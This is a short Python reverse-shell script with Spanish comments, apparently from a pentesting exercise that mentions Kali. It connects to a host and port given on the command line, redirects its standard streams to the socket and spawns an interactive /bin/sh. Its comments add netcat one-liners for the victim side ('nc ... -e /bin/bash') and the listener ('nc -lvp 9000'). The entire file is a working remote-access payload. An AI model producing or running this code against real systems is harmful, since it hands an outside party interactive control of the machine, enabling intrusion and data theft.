import socket,subprocess,os,sys 


# En este ejemplo nos quedamos a la escucha
# Conectarnos contrar una IP o puerto y enviar una Shell de bash

if len(sys.argv) != 3: 
    print("[-] usage: reverseShell.py <host> <port>") 
    exit() 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 


# Nosotros somos los que ofrecemos la conneccion y abrimos la terminal de bash
# MLinux : nc ipkali 9000 -e /bin/bash
s.connect((sys.argv[1],int(sys.argv[2])))



os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2) 

# Lo haremos con SH esta vez en  lugar de bash
p=subprocess.call(["/bin/sh","-i"]) 

# EN la otra maquina se pone a la escucha en el puerto 900(en elste caso)------ nc -lvp 9000